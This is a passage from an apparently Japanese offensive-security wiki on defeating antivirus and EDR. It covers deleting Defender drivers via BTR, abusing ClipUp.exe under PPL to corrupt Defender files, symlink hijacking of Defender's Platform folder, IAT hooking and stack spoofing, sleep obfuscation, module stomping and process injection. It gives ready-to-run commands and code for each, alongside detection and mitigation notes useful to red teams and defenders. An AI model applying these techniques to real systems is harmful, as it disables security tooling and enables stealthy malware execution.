BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`は使用できません。BTRはストレージスタックと`SystemRoot`リンクの準備が整う前に、`DriverEntry`からファイルI/Oを実行するためです。代わりに`Start=1`と優先度の高い`Boot Bus Extender`グループを指定すると、Phase 1で実行されます。この段階ではNTFSは使用可能ですが、多くのシステム起動時セキュリティドライバーやユーザーモードEDRサービスはまだ初期化されていません。`WdFilter`などのブート起動フィルターはすでに読み込まれている可能性がありますが、BTRは次回起動前にそのバイナリやサービス設定を削除でき、SCMがサービス実行ファイルを起動する前に削除することもできます。BTRはブート起動時の評価後に実行され、有効なMicrosoft署名を持つため、ELAMでもこの隙間は塞げません。<sup>[[36]](#references)</sup>

複数のアクションを1つのトランザクション内で実行します。PoCでは、ハードコードされた`\SystemRoot\Temp\BootClean.log`を対象とするAction 1を先頭に追加します。BTRはこのログを作成し、自身の削除要求を処理した後、アンロード前にログを削除します。これにより痕跡を減らせます。また、フィードバックを`<random>.sys:<random>.dat`に配置すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 検出精度の高い相関分析

署名のみを使うルールやMicrosoftの脆弱なドライバーのブロックリストでは、BTRの本来の機能の悪用には対処できません。正規のDefenderの系譜と任意のランチャーを区別しながら、以下の振る舞いを相関分析することを推奨します。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`の作成は、BTRのステージングで必ず発生します。同じ`.sys`に付加された`.dat` ADSは、特に疑わしい兆候です。正規のDefenderは通常、フィードバックを`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`以下に配置するためです。
- **System 7045を伴わないSysmon 12/13:** `Args=...:changelist`および`Group=Boot Bus Extender`を含む`HKLM\SYSTEM\CurrentControlSet\Services\<random>`の直接作成を、対応するSCMのインストールイベントがないことと相関させます。
- **Sysmon 6 -> 23:** Defender以外の系譜に属する既知のBTRドライバーの読み込みと、その後に`System`/PID 4が実行するファイル削除を相関させます。特にセキュリティ関連のバイナリが対象の場合は注意が必要です。
- **Sysmon 11 -> 23:** `System`/PID 4による`\SystemRoot\Temp\BootClean.log`の短時間での作成と削除を検知します。
- `SeLoadDriverPrivilege`の割り当てと有効化を制限し、監査します。`cmd.exe`、PowerShell、または不明なプロセスがセキュリティツールのドライバーをステージングしている場合、Microsoft署名だけでは信頼の根拠として不十分です。

## LOLBINを使用したProtected Process Light (PPL)の悪用によるAV/EDRの改ざん

Protected Process Light (PPL)は署名者と保護レベルの階層を適用し、同等以上の保護レベルを持つプロセスだけが互いに改ざんできるようにします。攻撃者の視点では、PPL対応バイナリを正規の方法で起動し、その引数を制御できれば、ロギングなどの無害な機能を、AV/EDRが使用する保護ディレクトリに対する、制約付きのPPLベースの書き込みプリミティブに変えられます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスをPPLとして実行する条件
- 対象のEXE（および読み込まれるDLL）は、PPL対応のEKUで署名されている必要があります。
- `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`フラグを指定して、CreateProcessでプロセスを作成する必要があります。
- バイナリの署名者に適合する保護レベルを指定する必要があります（例: マルウェア対策の署名者には`PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windowsの署名者には`PROTECTION_LEVEL_WINDOWS`）。レベルが適合しない場合、作成に失敗します。

PP/PPLとLSASS保護の概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象のEXEに渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用例:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け取ります。
- PPL プロセスとして起動すると、PPL の権限でファイルが書き込まれます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3 短縮パスを使用してください。

8.3 短縮パスのヘルパー
- 短縮名を一覧表示する: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を渡し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3 短縮名を使用します。
3) 対象バイナリが実行中に AV によって通常ロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、確実に先に実行される自動起動サービスをインストールして、起動時に書き込みをスケジュールします。Process Monitor のブートログで起動順序を検証します。
4) 再起動すると、PPL の権限での書き込みが AV によるバイナリのロック前に行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスは省略／短縮）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

メモと制約
- ClipUp が書き込む内容は配置場所を除いて制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動にはローカルの admin/SYSTEM 権限と、再起動可能な時間帯が必要です。
- タイミングが重要です。対象が開かれていない必要があります。起動時に実行すればファイルロックを回避できます。

検出
- 起動前後に、特に標準外のランチャーを親プロセスとする、異常な引数付きの `ClipUp.exe` のプロセス作成を検出します。
- 不審なバイナリを自動起動するよう設定された新しいサービスや、Defender/AV より常に先に起動するサービスを確認します。Defender の起動失敗に先立つサービスの作成／変更を調査します。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視を行い、保護プロセスのフラグを持つプロセスによる予期しないファイルの作成／変更を検出します。
- ETW/EDR テレメトリでは、`CREATE_PROTECTED_PROCESS` を指定して作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を調べます。

緩和策
- WDAC/Code Integrity を使用して、PPL として実行できる署名済みバイナリおよび許可する親プロセスを制限し、正当なコンテキスト以外での ClipUp の呼び出しをブロックします。
- サービス管理を徹底し、自動起動サービスの作成／変更を制限するとともに、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効であることを確認し、バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置したボリュームでの 8.3 短縮名の生成を無効にすることを検討します（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行元となるプラットフォームを選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

辞書順で最も大きいバージョン文字列を持つサブフォルダー（例: `4.18.25070.5-0`）を選択し、そこから Defender サービスのプロセスを起動します（サービス／レジストリのパスもそれに応じて更新します）。この選択では、ディレクトリの再解析ポイント（シンボリックリンク）を含むディレクトリエントリが信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル Administrator（Platform フォルダー内にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender によるプラットフォームの再選択をトリガーできること（起動時のサービス再起動）
- 組み込みツールのみで実行可能（mklink）

有効な理由
- Defender は自身のフォルダーへの書き込みをブロックしますが、プラットフォームの選択ではディレクトリエントリを信頼し、リンク先が保護された／信頼できるパスであることを検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在のプラットフォームフォルダーの書き込み可能なクローン（例: `C:\TMP\AV`）を用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダーを指す、より高いバージョン番号のディレクトリシンボリックリンクを作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）：
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、サービス構成／レジストリにもその場所が反映されていることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defenderがアプリケーションディレクトリから読み込むDLLを配置／置換し、Defenderのプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: バージョンのシンボリックリンクを削除すると、次回起動時に設定されたパスが解決できなくなり、Defenderの起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 単体では privilege escalation は行えません。admin 権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

レッドチームは、Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) 経由で呼び出すことで、runtime evasion を C2 implant の外部、つまり target module 自体に移せます。これにより、多くの kit が公開する限られた API (例: CreateProcessA) を超えて evasion を一般化し、同じ保護を BOF や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

概要
- reflective loader (先頭に追加するか、別ファイルとして配置) を使い、target module とともに PIC blob を配置します。PIC は自己完結型で、position-independent である必要があります。
- host DLL のロード時に、その IMAGE_IMPORT_DESCRIPTOR を走査し、対象の import (例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc) の IAT エントリを、薄い PIC wrapper を指すように書き換えます。
- 各 PIC wrapper は、実際の API アドレスを tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
  - 呼び出しの前後にメモリの mask/unmask を行う (例: beacon 領域の暗号化、RWX→RX、ページ名や権限の変更)。
  - Call-stack spoofing: 偽装した stack を構築し、target API に遷移して、call-stack 分析で想定どおりの frame が解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script (または同等のもの) から Beacon、BOF、post-ex DLL 用に hook する API を登録できる interface を export します。

ここで IAT hooking を使う理由
- hook した import を使うコードならどれでも機能し、tool のコードを変更したり、Beacon に特定の API を proxy させたりする必要がありません。
- post-ex DLL にも対応します。LoadLibrary* を hook すると、module のロード (例: System.Management.Automation.dll、clr.dll) を intercept し、その API 呼び出しにも同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper で包むことで、call-stack ベースの検知に対して、process を生成する post-ex command を安定して利用できます。

最小限の IAT hook の概要 (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注記
- relocations/ASLR の後、import の初回使用前に patch を適用します。TitanLdr/AceLdr のような Reflective loader は、ロードされたモジュールの DllMain 中に hooking を行う例です。
- wrapper は小さく、PIC-safe に保ちます。patch 前に取得した元の IAT 値、または LdrGetProcedureAddress を使って本来の API を解決します。
- PIC では RW → RX の遷移を使い、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr 形式の PIC stub は、benign なモジュール内の return address を使って偽の call chain を構築し、その後、本物の API に移ります。
- これにより、Beacon/BOFs から sensitive API への正規の stack を想定する検知を回避します。
- stack cutting/stack stitching の手法を組み合わせ、API prologue の前に想定される frame 内へ移動します。

運用への統合
- reflective loader を post-ex DLL の先頭に追加し、DLL のロード時に PIC と hooks が自動的に初期化されるようにします。
- Aggressor script で対象 API を登録すれば、Beacon と BOFs はコードを変更せずに同じ evasion path の恩恵を受けられます。

検知/DFIR の考慮事項
- IAT integrity: non-image（heap/anon）アドレスを指すエントリ、import pointer の定期的な検証。
- stack anomalies: loaded image に属さない return address、non-image PIC への急な遷移、一貫しない RtlUserThreadStart の祖先関係。
- loader telemetry: プロセス内での IAT 書き込み、import thunk を変更する早期の DllMain activity、ロード時に作成される想定外の RX region。
- image-load evasion: LoadLibrary* を hooking する場合は、memory masking event と相関する automation/clr assembly の疑わしいロードを監視します。

関連する構成要素と例
- ロード中に IAT patching を行う reflective loader（例: TitanLdr、AceLdr）
- memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐 PICO による import-time IAT hooks

reflective loader を制御できる場合、`GetProcAddress` pointer を hooks を先に確認する custom resolver に置き換えることで、`ProcessImports()` の**実行中**に imports を hook できます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的な loader PIC が自ら解放された後も存続する**resident PICO**（persistent PIC object）を構築します。
- `setup_hooks()` 関数を export し、loader の import resolver を上書きします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal imports をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使います。hook があればそれを返し、なければ本物の `GetProcAddress` に処理を委譲します。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entries を使い、link time に hook targets を登録します。hook は resident PICO 内にあるため有効なままです。

これにより、ロード後に DLL の code section を patch せずに、**import-time IAT redirection** を実現できます。

### 対象が PEB-walking を使う場合に hook 可能な imports を強制する

import-time hooks が動作するのは、その function が対象の IAT に実際に存在する場合だけです。モジュールが PEB-walk + hash で API を解決する場合（import entry がない場合）は、本物の import を強制し、loader の `ProcessImports()` path に認識させます。

- hash による export 解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような直接参照に置き換えます。
- compiler が IAT entry を生成するため、reflective loader が imports を解決する際に interception が可能になります。

### `Sleep()` を patch しない Ekko 形式の sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使う wait/IPC primitive（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook します。長時間の wait では、idle 中に in-memory image を暗号化する Ekko 形式の obfuscation chain で call をラップします:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使って、加工した `CONTEXT` frame で `NtContinue` を呼び出す一連の callback をスケジュールします。
- 典型的な chain（x64）: image を `PAGE_READWRITE` に設定 → マップ済み image 全体に対して `advapi32!SystemFunction032` で RC4 暗号化 → blocking wait を実行 → RC4 復号 → PE section を走査して**セクションごとの権限を復元** → 完了を通知。
- `RtlCaptureContext` で template `CONTEXT` を取得します。複数の frame に clone し、各 step を呼び出すように register（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長時間の wait（例: `WAIT_OBJECT_0`）では「success」を返し、image が mask されている間に caller が処理を続けられるようにします。この手法は idle window 中に scanner から module を隠し、典型的な「patched `Sleep()`」signature を避けます。

検知のアイデア（telemetry ベース）
- `NtContinue` を指す `CreateTimerQueueTimer` callback の集中発生。
- 大きな連続した image size の buffer に対する `advapi32!SystemFunction032` の使用。
- 広範囲の `VirtualProtect` 実行後に行われる、custom なセクションごとの権限復元。

### sleep-obfuscation gadget の runtime CFG registration

CFG が有効な対象では、`jmp [rbx]` や `jmp rdi` のような mid-function gadget への最初の indirect jump は、通常、gadget が module の CFG metadata に存在しないため、`STATUS_STACK_BUFFER_OVERRUN` で process を crash させます。hardened process 内で Ekko/Kraken 形式の chain を動作させるには:<sup>[[30]](#references)</sup>

- chain が使うすべての indirect destination を `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録します。
- loaded image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は**image base**から始まり、**image size 全体**をカバーする必要があります。
- manually mapped/PIC/stomped region では、代わりに**allocation base**と allocation size を使います。
- dispatch gadget だけでなく、間接的に呼び出される export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）と、間接的な呼び出し先となる attacker-controlled executable section も登録します。

これにより、ROP/JOP 形式の sleep chain を「non-CFG process でしか動作しない」ものから、`explorer.exe`、browser、`svchost.exe` など `/guard:cf` でコンパイルされた endpoint でも再利用できる primitive にできます。

### sleep 中の thread に対する CET-safe stack spoofing

`CONTEXT` 全体の置き換えは目立ちやすく、CET Shadow Stack system では spoof された `Rip` が hardware shadow stack と一致しないと問題が起きます。より安全な sleep-masking pattern は次のとおりです:<sup>[[30]](#references)</sup>

- 同じ process 内の別 thread を選び、`NtQueryInformationThread` でその `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）を読み取ります。
- 現在の thread の本物の TEB/TIB を backup します。
- `GetThreadContext` で実際の sleeping context を取得します。
- spoof context には本物の `Rip`**だけ**をコピーし、spoof された `Rsp`/stack state はそのままにします。
- sleep window 中は、stack walker が正規の stack range 内で unwind するよう、spoof thread の `NT_TIB` を現在の TEB にコピーします。
- wait の完了後、元の TIB と thread context を復元します。

これにより CET と整合する instruction pointer を保ちながら、unwind の検証に TEB stack metadata を信頼する EDR stack walker を誤認させます。

### APC ベースの代替案: Kraken Mask

timer-queue dispatch の signature が目立ちすぎる場合、同じ sleep-encrypt-spoof-restore sequence を、suspended helper thread 上で queued APC を使って実行できます:<sup>[[27]](#references)</sup>

- entrypoint を `NtTestAlert` にして helper thread を作成します。
- `NtQueueApcThread` で準備済みの `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で実行します。
- default の 64 KB thread stack を使い切らないよう、chain state は helper stack ではなく heap に保存します。
- `NtSignalAndWaitForSingleObject` で start event の通知と block を atomic に行います。
- scanner が復元途中の stack を捉える race window を減らすため、TIB/context を復元する前に main thread を suspend します（`NtSuspendThread` → restore → `NtResumeThread`）。

これにより、同じ RC4 masking と stack-spoofing の目的を保ったまま、`CreateTimerQueueTimer` + `NtContinue` の signature を helper-thread/APC の signature に置き換えます。

検知の追加アイデア
- sleep、wait、APC dispatch の直前に実行される `VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe` の前後で呼び出される `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に、現在の thread の TEB/TIB stack bounds へ直接書き込む処理。
- 間接的に `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- signed module 内で dispatch pivot として使われる、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）などの短い gadget signature の反復使用。


## Precision Module Stomping

Module stomping は、明らかに目立つ private executable memory を割り当てたり、新しい sacrificial DLL をロードしたりする代わりに、対象 process 内にすでにマップされている DLL の**`.text` section から payload を実行**します。overwrite 先には、process が引き続き必要とする code path を壊さず payload を収められる、**ロード済みで disk-backed の image**を選ぶ必要があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高い対象選定

`uxtheme.dll` や `comctl32.dll` などの一般的な module を使った単純な stomping は不安定です。DLL が remote process にロードされていない場合があり、code region が小さすぎると process が crash します。より信頼性の高い手順は次のとおりです。

1. 対象 process の module を列挙し、すでにロード済みの DLL の**名前のみの include list**を作成します。
2. payload を先に build し、**正確な byte size**を記録します。
3. disk 上の候補 DLL を調べ、PE section の **`.text` `Misc_VirtualSize`** と payload size を比較します。これは file size より重要です。メモリにマップされた**実行可能 section のサイズ**を反映するためです。
4. **Export Address Table（EAT）**を parse し、stomp 開始 offset として export された function の RVA を選びます。
5. **blast radius**を計算します。payload が選択した function の境界を超える場合、メモリ上で後続に配置された隣接 export を overwrite します。

実環境でよく見られる recon/選定用 helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意点
- `LoadLibrary` や予期しないイメージ読み込みの telemetry を避けるため、リモートプロセスですでに **ロード済み** の DLL を優先する。
- 対象アプリケーションで実行される頻度が低い export を優先する。そうしないと、スレッド作成の前後に通常のコードパスが stomp されたバイト列に到達する可能性がある。
- 大きな implant では、injector のソース内でバッファ全体を正しく表現できるよう、shellcode の埋め込みを文字列リテラルから **byte-array/braced initializer** に変更する必要がある場合が多い。

検出のアイデア
- 一般的な private RWX/RX allocation ではなく、**image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）へのリモート書き込み。
- メモリ上の export entry point のバイト列が、ディスク上の backing file と一致しない。
- 最近、先頭のバイト列が変更された正規 DLL export 内から実行を開始するリモートスレッドや context pivot。
- DLL の `.text` ページに対する不審な `VirtualProtect(Ex)` / `WriteProcessMemory` のシーケンスと、その後のスレッド作成。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** technique です。すでに実行中のターゲットにバイト列をコピーする代わりに、Windows が選択された `CreateProcessW` 起動パラメーターを子プロセスに **コピー** し、それらを `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる poisonable carrier

有用な carrier は次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` を指定）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

実用上の carrier の制約：

- `CreateProcessW` では `lpCommandLine` が **書き込み可能なメモリ** を指している必要があり、上限は null terminator を含めて **32,767 Unicode characters** です。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列と、末尾の追加の `\0` で構成される Unicode environment block である必要があります。
- `lpReserved` は公式には予約領域であるため、`ShellInfo` へのマッピングは安定した文書化済みの仕様ではなく、実装上の詳細として扱う必要があります。

これにより、通常のプロセス作成が **payload-transfer primitive** になります。オペレーターは攻撃者が制御する起動データを使って子プロセスを作成し、Windows にプロセス間コピーを実行させます。

### リモート書き込み API を使わないリモート検索フロー

子プロセスの作成後、**読み取り専用** の primitive を使ってコピーされたバッファを特定します。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使う：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. 通常どおりプロセスを作成する（一時停止状態にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` ですでに返されているメインスレッドハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行をリダイレクトする

従来の thread hijacking の手順とは異なり、これは `SuspendThread` / `ResumeThread` を**必要としません**。返されたメインスレッドハンドルに対して、直接コンテキストを変更できます。

これにより、インジェクションの監視でよく検出されるいくつかの API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も回避可能

### Null バイトの制限と staged shellcode

これら3つの carrier はすべて**文字列または文字列に類するデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の second stage を読み込む、**null-free first stage** を使うことです。

シンプルなパターンとして、XOR ベースの定数合成があります。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、first stage は、転送するパラメーターに null byte を埋め込まずに、stack 上に文字列、API 引数、DLL パス、または second-stage shellcode loader を構築できます。

### first stage からの stack-based API 呼び出し

first stage が `LoadLibraryA` などの API を呼び出す必要がある場合、次のようにできます。

- 文字列/buffer を target の stack に push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte aligned** に保つ

その後、second stage を stack から `PAGE_READWRITE` allocation にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してから jump すれば、直接 RWX allocation する必要がありません。

### 検出の手がかり

著者が挙げている有効な調査ポイントは次のとおりです。

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって**process-parameter pages を executable にする**動作
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` に対する remote read
- process 作成時の、通常より長い、または entropy の高い `lpCommandLine`、`lpEnvironment`、`STARTUPINFO.lpReserved` の値

### 注意事項

- P3 は**プロセス間の転送テクニック**であり、それ自体は完全な execution primitive ではありません。コピーされたパラメーターには、依然として execute permission への変更と execution redirection method が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity は著者らも検討しましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしい primitive を使用するため、採用されませんでした。

## コンソール STDIN pipe injection

対話型のコンソール子プロセスも、**payload-transfer primitive** として利用できます。injector は子プロセスの標準入力を pipe にリダイレクトし、marker に続けて shellcode を送信します。コンソールプログラムがデータを自身の private memory に読み込んだ後、injector はその buffer を見つけて executable にし、子プロセスの thread の実行先をそこへリダイレクトします。この方法では `VirtualAllocEx` と `WriteProcessMemory` を回避できますが、一般的な EDR bypass ではなく、依然として process injection です。<sup>[[41]](#references)</sup>

「named-pipe」と説明されていますが、参照実装が呼び出すのは `CreatePipe` であり、作成されるのは**匿名 pipe**です。Windows は匿名 pipe を内部的には一意の名前を持つ pipe object として実装していますが、この PoC は `\\.\pipe\<name>` パスを指定せず、`CreateNamedPipe` も呼び出しません。既定の security descriptor を使って inheritable handle を作成し、read handle を `STARTUPINFO.hStdInput` に設定し、`STARTF_USESTDHANDLES` を指定して、handle inheritance を有効にした状態で新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール executable を起動するものであり、既存のプロセスに pipe を接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参考ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に匿名 pipe pair を作成する。親側の 2 つの handle の inheritance を無効にし、process 作成後に親側で子プロセス側の重複 handle を閉じる。
2. `CREATE_NEW_CONSOLE` を指定して、`netsh.exe` や `nslookup.exe` などの対話型 executable を起動する。子プロセスはリダイレクトされた標準 handle を継承する。
3. 親側の `STDIN` handle を通じて、`WriteFile` で完全な binary `rawData` array を送信する。コンソールプログラムは byte 列を読み込み、そのコピーを自身の private committed region のいずれかに残す。
4. `VirtualQueryEx` で子プロセスの address space を調べ、`ReadProcessMemory` で候補の `MEM_PRIVATE` region を読み取り、`rawData` の先頭にある marker を検索する。
5. `VirtualProtectEx` で見つかった buffer を `PAGE_EXECUTE_READWRITE` に変更する。
6. main thread を特定して suspend し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから resume する。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込まれたpayloadはx64 shellcodeです。`rawData`は25バイトのマーカーで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。payloadを置き換える場合は、この配置を維持するか、マーカー、検索ベクトル、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントには、bad characterとして`0x0A`、`0x0D`、`0x1A`も記載されています。この手順では、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブヘルパーとpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## Fileless Evasionと認証情報窃取のためのSantaStealerの手口

